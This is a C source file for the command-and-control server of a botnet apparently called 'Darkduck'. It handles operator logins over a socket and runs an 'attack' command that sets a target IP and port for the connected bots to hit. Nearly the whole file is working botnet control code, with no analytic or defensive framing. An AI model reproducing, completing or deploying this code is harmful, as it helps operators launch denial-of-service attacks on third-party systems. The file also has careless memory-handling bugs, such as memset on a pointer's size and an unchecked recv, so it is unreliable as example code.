#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdbool.h>
#include <sys/socket.h>

#include "cnc.h"
#include "common.h"
#include "argparse.h"
#include "database.h"

extern struct attack *attack_target;

struct cnc new_cnc(int client_fd) {
	struct cnc cnc_client;
	cnc_client.cnc_fd = client_fd;
    cnc_client.is_connected = false;
	return cnc_client;
}

void handle(struct cnc cnc_client) {

  	char buffer[BUFFER_SIZE];
  	int read_size;

	char *argv[10] = {0};
	int   argc     = 0;
    
    struct user user;

  	send_message(cnc_client,(char *) WELCOME);

    while (1) {
#ifdef DEBUG
    printf("Darkduck : CNC  printing ip : %s \n", attack_target->ip);
#endif


        read_size = recv(cnc_client.cnc_fd , buffer , 1000 , 0);
        buffer[read_size-1] = '\0';

        if(read_size == 1) {
            write(cnc_client.cnc_fd, SHELL, strlen(SHELL));
            continue;
        }

        tokenise_to_argc_argv(buffer, &argc, argv, sizeof(argv));

        if (argc == 1) {
            send_message(cnc_client, "Hummm ? \n");
            continue;            
        }

        if (strcmp(argv[0],"Duck") != 0) {
#ifdef DEBUG
    printf("Darkduck : Not for me ( ˃̶͈ ̯ ̜ ˂̶͈ˊ ) ︠³ ! \n"); 
#endif
            continue;
        }

        char *command     = NULL;
        char *username    = NULL;
        char *password    = NULL;
        char *message     = NULL;
        char *target      = NULL;
        int   port        = -1;
        
        struct argparse_option options[] = {
            OPT_HELP(),
            OPT_GROUP("Connect command"),
            OPT_STRING('c', "command", &command, "Command to execute"),
            OPT_STRING('u', "username", &username, ""),
            OPT_STRING('p', "password", &password, ""),
            OPT_STRING('m', "message", &message, "Message to repeat"),
            OPT_GROUP("Attack command"),
            OPT_STRING('t', "target", &target, "Command to execute"),
            OPT_INTEGER('P', "port", &port, ""),
            OPT_END(),
        };

        struct argparse argparse;
        argparse_init(&argparse, options, NULL, 0);
        argparse_describe(&argparse, "", "");
        argc = argparse_parse(&argparse, argc, (const char **)argv);


        if (argc == -1) continue;

        if (strcmp("connect",command) == 0) {
            if (password == NULL) {
                write(cnc_client.cnc_fd, " Password : \e[8m", strlen(" Password : \e[8m"));

                read_size = recv(cnc_client.cnc_fd , buffer , 100 , 0);
                buffer[read_size-1] = '\0';            

                password = buffer;
            }
            
            if (username == NULL || password == NULL) {
                return;
            }

            if(connect_user(username, password, &user)){
                cnc_client.is_connected = true;
                send_message(cnc_client, (char *) CONNECTED);
            } else {
#ifdef DEBUG
    printf("Darkduck : Somebody failed to connect ! \n"); 
    printf("\t Username: %s \n", username);
    printf("\t Password: %s \n", password);
#endif        
                send_message(cnc_client, (char *) NOT_CONNECTED);

            }

            memset(username, 0, sizeof(username));
            memset(password, 0, sizeof(password));

            continue;
       
        } else if (strcmp("attack",command) == 0) {

            if (target == NULL || port == -1) {
                return;
            }

            char confirm[] = "Confirm attack (y/n) ? : ";
            write(cnc_client.cnc_fd, confirm, strlen(confirm));

            read_size = recv(cnc_client.cnc_fd , buffer , 1 , 0);
            if(read_size < 1) continue;

            if(buffer[0] != 'y') continue;
            send_message(cnc_client, "Darkduck : Sir !!! YES SIR !!! \n");

#ifdef DEBUG
    printf("Darkduck : Launch attack to %s on %d! \n", target, port); 
#endif        

            strcpy(attack_target->ip, target);
            attack_target->port = port;
            attack_target->attack = true;

        } else if (strcmp("repeat",command) == 0) {
            char *temp = (char*) malloc(strlen(HOLO) + strlen(message) + 2);
            
            strcpy(temp, HOLO);
            strcat(temp, message);
            strcat(temp, "\n\0");

            send_message(cnc_client, temp);

            free(temp);
        }

    }
}


void send_message(struct cnc cnc_client, char *message) {
	write(cnc_client.cnc_fd, message, strlen(message));
	write(cnc_client.cnc_fd, SHELL, strlen(SHELL));
}